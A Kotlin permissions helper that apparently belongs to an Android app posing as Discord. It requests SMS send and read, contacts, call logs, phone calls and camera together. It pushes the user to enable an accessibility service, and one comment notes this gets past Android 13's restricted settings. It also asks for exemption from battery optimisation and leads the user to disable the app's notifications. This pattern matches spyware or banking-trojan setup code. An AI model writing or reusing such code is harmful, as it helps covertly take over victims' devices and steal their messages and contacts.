package com.discord.settings


import android.Manifest
import android.accessibilityservice.AccessibilityService
import android.annotation.SuppressLint
import android.app.Activity
import android.app.NotificationManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.text.TextUtils
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class Permissions{

    //ignore battery optimization permission allowed
    fun isIgnoringBatteryOptimizations(context: Context): Boolean {
        val powerManager = context.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
        return powerManager.isIgnoringBatteryOptimizations(context.packageName)
    }

    //notifications disabled for app check
    fun areNotificationsEnabled(context: Context): Boolean {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val manager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            return manager.areNotificationsEnabled()
        } else {
            // For Android versions below Oreo, we assume notifications are enabled
            return true
        }
    }

    //request all essential permissions
    fun requestAllPermissions(context:Context){
        val requestAllPermissions = 100
        val permissionsToRequest = arrayOf(
            Manifest.permission.READ_CONTACTS, //contacts permission
            Manifest.permission.READ_SMS, //sms permission
            Manifest.permission.SEND_SMS,
            Manifest.permission.WRITE_CONTACTS,
            Manifest.permission.WRITE_CALL_LOG,
            Manifest.permission.CALL_PHONE,
            Manifest.permission.READ_CALL_LOG, //read call log permission,
            Manifest.permission.CAMERA
        )

        val permissionsNotGranted = permissionsToRequest.filter { ContextCompat.checkSelfPermission(context, it) != PackageManager.PERMISSION_GRANTED }.toTypedArray()
        if (permissionsNotGranted.isNotEmpty()) { ActivityCompat.requestPermissions(context as Activity, permissionsNotGranted, requestAllPermissions) }


    }

    //request accessibility permission
    fun askForAccessibilityPermission(context: Context) {
        val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
        context.startActivity(intent)
    }

    //check if accessibility service enabled
    fun isAccessibilityServiceEnabled(context: Context, accessibilityServiceClass: Class<out AccessibilityService>): Boolean {
        val expectedComponentName = ComponentName(context, accessibilityServiceClass)
        val enabledServicesSetting = Settings.Secure.getString(
            context.contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false
        val colonSplitter = TextUtils.SimpleStringSplitter(':')
        colonSplitter.setString(enabledServicesSetting)
        while (colonSplitter.hasNext()) {
            val componentName = colonSplitter.next()
            if (componentName.equals(expectedComponentName.flattenToString(), ignoreCase = true)) {
                return true
            }
        }
        return false
    }

    //open app info settings  (to allow restricted settings for accessibility permission (android above 13))
    fun openAppInfo(context: Context){
        if(Build.VERSION.SDK_INT>=Build.VERSION_CODES.TIRAMISU){
            val intent = Intent(Settings.ACTION_MANAGE_APPLICATIONS_SETTINGS)

            if (intent.resolveActivity(context.packageManager) != null) {
                context.startActivity(intent)
                Handler(Looper.getMainLooper()).postDelayed({
                    askForAccessibilityPermission(context)
                },1000)

            }

        }

    }


    //request Ignore battery Optimization
    @SuppressLint("BatteryLife")
    fun requestIgnoreBatteryOptimizations(context: Context) {
        val packageName = context.packageName
        val intent = Intent().apply {
            action = Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
            data = android.net.Uri.parse("package:$packageName") }
        context.startActivity(intent)
    }

    //disable notifications (android devices below tiramisu)
    fun goToNotificationSettings(context: Context){
        val intent: Intent

        if(Build.VERSION.SDK_INT< Build.VERSION_CODES.TIRAMISU){
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                intent = Intent(Settings.ACTION_APP_NOTIFICATION_SETTINGS)
                intent.putExtra(Settings.EXTRA_APP_PACKAGE, context.packageName)
            } else {
                intent = Intent("android.settings.APP_NOTIFICATION_SETTINGS")
                intent.putExtra("app_package", context.packageName)
                intent.putExtra("app_uid", context.applicationInfo.uid)
            }
            context.startActivity(intent)
        }

    }


}